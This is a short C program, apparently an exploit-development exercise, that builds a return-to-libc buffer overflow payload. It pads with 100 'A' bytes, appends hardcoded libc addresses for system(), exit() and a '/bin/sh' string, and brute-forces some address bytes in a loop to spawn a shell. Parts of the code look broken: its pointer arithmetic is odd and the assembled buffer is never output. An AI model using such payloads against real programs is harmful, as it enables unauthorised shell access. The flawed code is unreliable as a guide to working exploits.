#include <stdio.h>
#include <string.h>
/* author: @bugsam
 * date: 11/05/2019
 * */

// convert big endian to little endian
void le(unsigned long *big, unsigned long **little){
	int bits = 32;
	for(int i=0; i<4; i++){
		int j=0;
		for(int x=0; x<bits; x+=8){
			*(little+i*sizeof(unsigned long)+j)=(unsigned long *)((big[i]>>x)&0xFF);
			j++;
		}	
	}
}

int main(void){

	int bits;
	unsigned long hex_ecx, hex_system, hex_exit, hex_shell, nop[100];

	// variables in big endian
	hex_ecx = 0xb7e127a0;
	hex_system = 0xb7d656e0;
	hex_exit = 0xb7d587a0;
	hex_shell = 0xb7ea2f68;

	unsigned long arraybe[] = {hex_ecx, hex_system, hex_exit, hex_shell};
	unsigned long arrayle[4][4] = {	{0x00, 0x00, 0x00, 0x00},
					{0x00, 0x00, 0x00, 0x00},	
					{0x00, 0x00, 0x00, 0x00},
					{0x00, 0x00, 0x00, 0x00} };

	// convert big endian to little endian
	le((unsigned long *)arraybe, (unsigned long **)arrayle);

	// crack 
	for (int x=0x0; x<0xfff; x++){
		char buffer[100];
		int slice = 0;

		for(int i=0; i<100; i++){
			nop[i] = 0x41;
			slice += sprintf(buffer+slice,"%c",nop[i]);
		}
		slice += sprintf(buffer+slice,"%c",(arrayle[0][0]));
		slice += sprintf(buffer+slice,"%03c",x);
		slice += sprintf(buffer+slice,"%c",(arrayle[0][3]));
		for(int i=1; i<4; i++){
			for(int j=0; j<4; j++){
				slice += sprintf(buffer+slice,"%c",(arrayle[i][j]));	
			}
		}

	}
	printf("\n");
	return 0;
}
